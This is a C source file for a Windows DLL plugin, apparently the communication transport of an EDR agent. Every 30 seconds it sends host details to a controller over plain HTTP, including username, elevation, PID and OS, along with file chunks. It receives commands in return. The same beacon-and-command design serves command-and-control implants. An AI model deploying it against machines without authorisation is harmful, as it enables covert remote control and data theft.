/*
 * vpn_comm.c — VPN communication transport plugin (beacon-based).
 *
 * Implements edr_iface_comm_t following the same beacon pattern as https_comm.
 * Sends/receives JSON to /api/v1/beacon on the controller.
 *
 * Beacon protocol (same as HTTPS):
 *   POST /api/v1/beacon (JSON)
 *   Outbound: {"agent_id":"...", "seq":N, "hostname":"...", ..., "msgs":[...]}
 *   Inbound:  {"commands":[{"command_id":"...", "seq":N, "payload":"..."}]}
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

#include "edr_plugin.h"
#include "edr_interfaces.h"

/* Dispatcher function types and pointers */
typedef struct edr_dispatcher edr_dispatcher_t;
typedef uint32_t (*edr_get_chunks_fn)(edr_dispatcher_t *d, char **chunks, uint32_t max);

static edr_dispatcher_t *g_dispatcher = NULL;
static edr_get_chunks_fn get_chunks_fn = NULL;

/* ─── Constants ────────────────────────────────────────────────── */
#define SEND_QUEUE_CAP   64
#define JSON_OUT_BUF     65536
#define JSON_IN_BUF      131072
#define BEACON_PATH      "/api/v1/beacon"
#define BEACON_MS        30000           /* 30 s default interval */

/* ─── Plugin globals ───────────────────────────────────────────── */
static const edr_plugin_services_t *g_svc      = NULL;
static const edr_agent_identity_t  *g_identity  = NULL;

/* ─── System info ──────────────────────────────────────────────── */
static char g_username[64]  = "unknown";
static char g_os[128]       = "Windows";
static char g_arch[16]      = "unknown";
static int  g_pid           = 0;
static int  g_elevated      = 0;

static void gather_sysinfo(void) {
    g_pid = (int)GetCurrentProcessId();

    DWORD sz = (DWORD)sizeof(g_username);
    GetUserNameA(g_username, &sz);

    HANDLE tok = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        TOKEN_ELEVATION elev;
        DWORD ret = 0;
        if (GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &ret))
            g_elevated = elev.TokenIsElevated;
        CloseHandle(tok);
    }

#if defined(__x86_64__) || defined(_M_X64)
    strcpy(g_arch, "x86_64");
#elif defined(__i386__) || defined(_M_IX86)
    strcpy(g_arch, "x86");
#elif defined(__aarch64__) || defined(_M_ARM64)
    strcpy(g_arch, "arm64");
#endif

    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD type, vlen = (DWORD)sizeof(g_os);
        RegQueryValueExA(hk, "ProductName", NULL, &type,
                         (LPBYTE)g_os, &vlen);
        RegCloseKey(hk);
    }
}

/* ─── Connection state ─────────────────────────────────────────── */
static char g_hostname[512] = {0};
static int  g_port = 4444;
static volatile int g_connected = 0;

static edr_recv_cb_t g_recv_cb = NULL;
static void *g_recv_ctx = NULL;

/* ─── Send queue (circular buffer) ─────────────────────────────── */
static char *g_queue[SEND_QUEUE_CAP];
static int g_qhead = 0, g_qtail = 0;
static CRITICAL_SECTION g_qmu;

static int q_empty(void) { return g_qhead == g_qtail; }
static int q_full(void)  { return ((g_qtail + 1) % SEND_QUEUE_CAP) == g_qhead; }

static int q_push(const char *s) {
    if (q_full()) return 0;
    size_t n = strlen(s) + 1;
    char *c = (char *)malloc(n);
    if (!c) return 0;
    memcpy(c, s, n);
    g_queue[g_qtail] = c;
    g_qtail = (g_qtail + 1) % SEND_QUEUE_CAP;
    return 1;
}

static char *q_pop(void) {
    if (q_empty()) return NULL;
    char *p = g_queue[g_qhead];
    g_queue[g_qhead] = NULL;
    g_qhead = (g_qhead + 1) % SEND_QUEUE_CAP;
    return p;
}

static void vpn_enqueue_message(const char *msg) {
    if (!msg) return;
    if (q_full()) return;
    char *copy = (char *)malloc(strlen(msg) + 1);
    if (!copy) return;
    strcpy(copy, msg);
    EnterCriticalSection(&g_qmu);
    g_queue[g_qtail] = copy;
    g_qtail = (g_qtail + 1) % SEND_QUEUE_CAP;
    LeaveCriticalSection(&g_qmu);
}

/* ─── Beacon thread control ────────────────────────────────────── */
static HANDLE g_thread = NULL;
static HANDLE g_stop_evt = NULL;
static HANDLE g_wake_evt = NULL;
static volatile uint64_t g_seq = 0;

/* ─── Logging helper ───────────────────────────────────────────── */
#define PLOG(lvl, fmt, ...) do { \
    if (g_svc && g_svc->log)     \
        g_svc->log(lvl, "vpn_comm", fmt, ##__VA_ARGS__); \
} while (0)

/* Called by main executable to register dispatcher and function pointer */
__declspec(dllexport) void vpn_set_dispatcher(edr_dispatcher_t *d, edr_get_chunks_fn fn) {
    g_dispatcher = d;
    get_chunks_fn = fn;
    PLOG(EDR_LOG_DEBUG, "Dispatcher registered: d=%p fn=%p", d, fn);
}

/* ─── JSON helpers ─────────────────────────────────────────────── */

static int json_esc(char *dst, size_t dsz, const char *src) {
    int n = 0;
    for (; *src && (size_t)(n + 2) < dsz; src++) {
        unsigned char c = (unsigned char)*src;
        if      (c == '"' || c == '\\') { dst[n++] = '\\'; dst[n++] = c; }
        else if (c == '\n')              { dst[n++] = '\\'; dst[n++] = 'n'; }
        else if (c == '\r')              { dst[n++] = '\\'; dst[n++] = 'r'; }
        else if (c >= 0x20)              { dst[n++] = c; }
    }
    dst[n] = '\0';
    return n;
}

static int json_get_str(const char *json, const char *key,
                        char *out_buf, size_t out_sz) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":\"", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz - 1) {
        if (*p == '\\' && *(p + 1)) p++;
        out_buf[i++] = *p++;
    }
    out_buf[i] = '\0';
    return (int)i;
}

static uint64_t json_get_u64(const char *json, const char *key) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    return (uint64_t)strtoull(p + strlen(needle), NULL, 10);
}

/* ─── Build beacon body from queue ─────────────────────────────── */
static char *build_body(void) {
    char *buf = (char *)malloc(JSON_OUT_BUF);
    if (!buf) return NULL;

    char id_e[EDR_AGENT_ID_LEN * 2] = "unknown";
    char host_e[256] = "unknown";
    char user_e[128] = "unknown";
    char os_e[256] = "Windows";
    char arch_e[32] = "unknown";

    if (g_identity) {
        json_esc(id_e,   sizeof(id_e),   g_identity->agent_id);
        json_esc(host_e, sizeof(host_e), g_identity->hostname);
    }
    json_esc(user_e, sizeof(user_e), g_username);
    json_esc(os_e,   sizeof(os_e),   g_os);
    json_esc(arch_e, sizeof(arch_e), g_arch);

    int n = snprintf(buf, JSON_OUT_BUF,
        "{\"agent_id\":\"%s\",\"seq\":%llu"
        ",\"hostname\":\"%s\",\"username\":\"%s\""
        ",\"os\":\"%s\",\"arch\":\"%s\""
        ",\"pid\":%d,\"elevated\":%d"
        ",\"msgs\":[",
        id_e, (unsigned long long)g_seq++,
        host_e, user_e, os_e, arch_e,
        g_pid, g_elevated);

    EnterCriticalSection(&g_qmu);
    int first = 1;
    char *entry;
    while ((entry = q_pop()) != NULL) {
        if (!first && n < JSON_OUT_BUF - 2) buf[n++] = ',';
        first = 0;
        int rem = JSON_OUT_BUF - n - 4;
        int elen = (int)strlen(entry);
        if (rem > 0) { int cp = elen < rem ? elen : rem; memcpy(buf+n, entry, cp); n += cp; }
        free(entry);
    }
    LeaveCriticalSection(&g_qmu);

    /* Pull file chunks from dispatcher */
    if (get_chunks_fn && g_dispatcher) {
        char *chunks[16];
        uint32_t count = get_chunks_fn(g_dispatcher, chunks, 16);
        for (uint32_t i = 0; i < count; i++) {
            if (chunks[i] && n < JSON_OUT_BUF - 4) {
                if (!first && n < JSON_OUT_BUF - 2) buf[n++] = ',';
                first = 0;
                int rem = JSON_OUT_BUF - n - 4;
                int clen = (int)strlen(chunks[i]);
                if (rem > 0) { int cp = clen < rem ? clen : rem; memcpy(buf+n, chunks[i], cp); n += cp; }
                free(chunks[i]);
            }
        }
    }

    if (n < JSON_OUT_BUF - 3) { buf[n++] = ']'; buf[n++] = '}'; buf[n] = '\0'; }
    return buf;
}

/* ─── Parse response commands ──────────────────────────────────── */
static void handle_response(const char *resp) {
    if (!g_recv_cb) return;

    const char *arr = strstr(resp, "\"commands\":[");
    if (!arr) return;
    arr += strlen("\"commands\":[");

    for (;;) {
        while (*arr && *arr != '{') arr++;
        if (!*arr) break;

        const char *start = arr;
        int depth = 0;
        const char *p = arr;
        while (*p) {
            if      (*p == '"') { p++; while (*p && *p != '"') { if (*p == '\\') p++; if (*p) p++; } }
            else if (*p == '{') depth++;
            else if (*p == '}') { if (--depth == 0) { p++; break; } }
            if (*p) p++;
        }

        size_t obj_len = (size_t)(p - start);
        char *obj = (char *)malloc(obj_len + 1);
        if (obj) {
            memcpy(obj, start, obj_len);
            obj[obj_len] = '\0';

            edr_message_t msg;
            memset(&msg, 0, sizeof(msg));
            msg.type = EDR_MSG_COMMAND;
            msg.seq = json_get_u64(obj, "seq");
            msg.correlation_id = 0;
            msg.timestamp = (time_t)time(NULL);
            json_get_str(obj, "command_id", msg.command_id, sizeof(msg.command_id));

            static char payload_buf[4096];
            json_get_str(obj, "payload", payload_buf, sizeof(payload_buf));
            msg.payload.data = (uint8_t *)payload_buf;
            msg.payload.len = strlen(payload_buf);

            if (msg.command_id[0] != '\0') {
                PLOG(EDR_LOG_DEBUG, "recv '%s' seq=%llu",
                     msg.command_id, (unsigned long long)msg.seq);
                g_recv_cb(&msg, g_recv_ctx);
            }
            free(obj);
        }
        arr = p;
    }
}

/* ─── Single beacon cycle ──────────────────────────────────────── */
static void do_beacon(void) {
    char *body = build_body();
    if (!body) { PLOG(EDR_LOG_ERROR, "OOM building body"); return; }

    /* Create socket */
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        PLOG(EDR_LOG_WARN, "socket() failed: %d", WSAGetLastError());
        free(body);
        return;
    }

    /* Connect */
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(g_port);
    inet_pton(AF_INET, g_hostname, &addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
        PLOG(EDR_LOG_WARN, "connect() failed: %d", WSAGetLastError());
        closesocket(sock);
        free(body);
        return;
    }

    PLOG(EDR_LOG_DEBUG, "Connected to %s:%d", g_hostname, g_port);

    /* Build HTTP POST request */
    char http_req[1024];
    int req_len = snprintf(http_req, sizeof(http_req),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n",
        BEACON_PATH, g_hostname, strlen(body));

    /* Send HTTP header */
    int sent = send(sock, http_req, req_len, 0);
    if (sent < req_len) {
        PLOG(EDR_LOG_WARN, "send header failed");
        closesocket(sock);
        free(body);
        return;
    }

    /* Send body */
    int blen = (int)strlen(body);
    sent = send(sock, body, blen, 0);
    if (sent < blen) {
        PLOG(EDR_LOG_WARN, "send body failed");
        closesocket(sock);
        free(body);
        return;
    }

    free(body);

    /* Read response */
    char *resp = (char *)malloc(JSON_IN_BUF);
    if (resp) {
        int total = 0;
        while (total < JSON_IN_BUF - 1) {
            int got = recv(sock, resp + total, JSON_IN_BUF - 1 - total, 0);
            if (got <= 0) break;
            total += got;
        }
        resp[total] = '\0';

        if (total > 0) {
            PLOG(EDR_LOG_DEBUG, "Beacon OK (%d bytes)", total);
            handle_response(resp);
        }
        free(resp);
    }

    closesocket(sock);
}

/* ─── Beacon thread ────────────────────────────────────────────── */
static DWORD WINAPI beacon_proc(LPVOID arg) {
    (void)arg;
    PLOG(EDR_LOG_INFO, "Beacon thread started → %s:%d",
         g_hostname, g_port);

    HANDLE evts[2] = { g_wake_evt, g_stop_evt };

    while (1) {
        do_beacon();
        DWORD result = WaitForMultipleObjects(2, evts, FALSE, BEACON_MS);
        if (result == WAIT_OBJECT_0) {
            /* wake_evt fired */
            continue;
        } else if (result == WAIT_OBJECT_0 + 1) {
            /* stop_evt — exit cleanly */
            break;
        }
        /* WAIT_TIMEOUT — normal interval */
    }

    PLOG(EDR_LOG_INFO, "Beacon thread stopped");
    return 0;
}

/* ─── edr_iface_comm_t ─────────────────────────────────────────── */

static edr_status_t comm_connect(const edr_endpoint_t *ep,
                                  edr_completion_cb_t cb, void *ctx) {
    if (!ep) return EDR_ERR_INVALID_ARG;
    if (g_connected) { if (cb) cb(ctx, EDR_OK, NULL); return EDR_OK; }

    /* Parse URL — strip scheme */
    const char *host = ep->url;
    if (strncmp(host, "http://", 7) == 0) host += 7;
    else if (strncmp(host, "https://", 8) == 0) host += 8;

    /* Strip path */
    char host_only[512] = {0};
    const char *slash = strchr(host, '/');
    size_t hlen = slash ? (size_t)(slash - host) : strlen(host);
    if (hlen >= sizeof(host_only)) hlen = sizeof(host_only) - 1;
    memcpy(host_only, host, hlen);

    strncpy(g_hostname, host_only, sizeof(g_hostname) - 1);
    g_port = ep->port ? ep->port : 4444;

    /* Create sync objects */
    g_stop_evt = CreateEvent(NULL, TRUE, FALSE, NULL);
    g_wake_evt = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!g_stop_evt || !g_wake_evt) {
        return EDR_ERR_GENERIC;
    }

    InitializeCriticalSection(&g_qmu);

    /* Start beacon thread */
    g_thread = CreateThread(NULL, 0, beacon_proc, NULL, 0, NULL);
    if (!g_thread) {
        PLOG(EDR_LOG_ERROR, "CreateThread failed");
        DeleteCriticalSection(&g_qmu);
        CloseHandle(g_stop_evt);
        CloseHandle(g_wake_evt);
        return EDR_ERR_GENERIC;
    }

    g_connected = 1;
    PLOG(EDR_LOG_INFO, "Connected to %s:%d", host_only, g_port);
    if (cb) cb(ctx, EDR_OK, NULL);
    return EDR_OK;
}

static edr_status_t comm_disconnect(edr_completion_cb_t cb, void *ctx) {
    if (!g_connected) { if (cb) cb(ctx, EDR_OK, NULL); return EDR_OK; }

    if (g_stop_evt) SetEvent(g_stop_evt);
    if (g_thread) {
        WaitForSingleObject(g_thread, 5000);
        CloseHandle(g_thread);
        g_thread = NULL;
    }
    if (g_stop_evt) { CloseHandle(g_stop_evt); g_stop_evt = NULL; }
    if (g_wake_evt) { CloseHandle(g_wake_evt); g_wake_evt = NULL; }

    EnterCriticalSection(&g_qmu);
    char *e;
    while ((e = q_pop()) != NULL) free(e);
    LeaveCriticalSection(&g_qmu);
    DeleteCriticalSection(&g_qmu);

    g_connected = 0;
    PLOG(EDR_LOG_INFO, "Disconnected");
    if (cb) cb(ctx, EDR_OK, NULL);
    return EDR_OK;
}

static edr_status_t comm_send(const edr_message_t *msg,
                               edr_completion_cb_t cb, void *ctx) {
    if (!msg) return EDR_ERR_INVALID_ARG;

    char cmd_e[128];
    json_esc(cmd_e, sizeof(cmd_e), msg->command_id);

    char json[1024];
    snprintf(json, sizeof(json),
        "{\"command_id\":\"%s\",\"seq\":%llu,\"type\":%d}",
        cmd_e, (unsigned long long)msg->seq, (int)msg->type);

    EnterCriticalSection(&g_qmu);
    int ok = q_push(json);
    LeaveCriticalSection(&g_qmu);

    if (!ok) {
        PLOG(EDR_LOG_WARN, "Send queue full");
        if (cb) cb(ctx, EDR_ERR_BUSY, NULL);
        return EDR_ERR_BUSY;
    }

    /* Wake beacon thread immediately */
    if (g_wake_evt) SetEvent(g_wake_evt);
    if (cb) cb(ctx, EDR_OK, NULL);
    return EDR_OK;
}

static edr_status_t comm_set_recv(edr_recv_cb_t handler, void *ctx) {
    g_recv_cb = handler;
    g_recv_ctx = ctx;
    return EDR_OK;
}

static edr_status_t comm_heartbeat(edr_completion_cb_t cb, void *ctx) {
    PLOG(EDR_LOG_DEBUG, "heartbeat");
    if (g_wake_evt) SetEvent(g_wake_evt);
    if (cb) cb(ctx, EDR_OK, NULL);
    return EDR_OK;
}

static int comm_is_connected(void) { return g_connected; }

static const edr_iface_comm_t s_comm = {
    .connect = comm_connect,
    .disconnect = comm_disconnect,
    .send = comm_send,
    .set_recv_handler = comm_set_recv,
    .heartbeat = comm_heartbeat,
    .is_connected = comm_is_connected,
};

/* ─── Plugin lifecycle ─────────────────────────────────────────── */

static edr_status_t plugin_init(const edr_plugin_services_t *svc,
                                 const edr_agent_identity_t *identity) {
    g_svc = svc;
    g_identity = identity;
    gather_sysinfo();

    /* Initialize Winsock */
    WSADATA wsd;
    if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
        PLOG(EDR_LOG_ERROR, "WSAStartup failed: %d", WSAGetLastError());
        return EDR_ERR_IO;
    }

    PLOG(EDR_LOG_INFO, "Initialized for agent '%s' pid=%d user=%s os=%s",
         identity ? identity->agent_id : "?", g_pid, g_username, g_os);
    return EDR_OK;
}

static edr_status_t plugin_shutdown(void) {
    comm_disconnect(NULL, NULL);
    WSACleanup();
    g_svc = NULL;
    PLOG(EDR_LOG_INFO, "Shutdown");
    return EDR_OK;
}

static const edr_iface_comm_t *get_comm(void) { return &s_comm; }

/* ─── Plugin entry ─────────────────────────────────────────────── */

__declspec(dllexport)
edr_status_t edr_plugin_entry(edr_plugin_manifest_t *out) {
    if (!out) return EDR_ERR_INVALID_ARG;

    out->abi_version.major = EDR_INTERFACE_VERSION_MAJOR;
    out->abi_version.minor = EDR_INTERFACE_VERSION_MINOR;
    out->abi_version.patch = EDR_INTERFACE_VERSION_PATCH;

    strncpy(out->name, "vpn-transport", sizeof(out->name) - 1);
    strncpy(out->vendor, "cynosure", sizeof(out->vendor) - 1);

    out->plugin_version.major = 1;
    out->plugin_version.minor = 0;
    out->plugin_version.patch = 0;

    out->capabilities = EDR_CAP_COMM_TRANSPORT;
    out->priority = 5;

    out->init = plugin_init;
    out->shutdown = plugin_shutdown;

    out->get_comm = get_comm;
    out->get_file_ops = NULL;
    out->get_scan = NULL;
    out->get_event = NULL;
    out->get_remediation = NULL;
    out->get_config = NULL;
    out->get_health = NULL;
    out->get_auth = NULL;

    return EDR_OK;
}

/* ─── DLL entry ────────────────────────────────────────────────── */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL; (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_DETACH && g_connected)
        comm_disconnect(NULL, NULL);
    return TRUE;
}
